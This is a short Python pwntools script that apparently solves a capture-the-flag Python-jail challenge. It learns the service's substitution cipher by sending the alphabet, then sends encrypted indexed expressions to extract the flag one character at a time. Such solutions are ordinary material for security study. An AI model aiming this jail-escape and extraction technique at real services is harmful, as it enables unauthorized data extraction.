from pwn import *
import string

io = remote("chal.thjcc.org", 15514)

# build cipher mapping
def build_cipher_map(ciphertext):
    return {p: c for p, c in zip(string.ascii_lowercase, ciphertext)}

io.sendlineafter(b'>', string.ascii_lowercase.encode())

cipher = io.recvline().decode().strip()

cipher_map = build_cipher_map(cipher)

def encrypt(text):
    return "".join(cipher_map.get(c, c) for c in text)

# actual jail
flag = ''
idx = 0

while not flag.endswith('}'):
    print(flag)

    io.sendlineafter(b'>', encrypt(f'flag[{idx}]').encode())

    resp  = io.recvline().decode().strip()
    
    if len(resp) == 1:
        flag += resp
        idx += 1

print("Flag:", flag)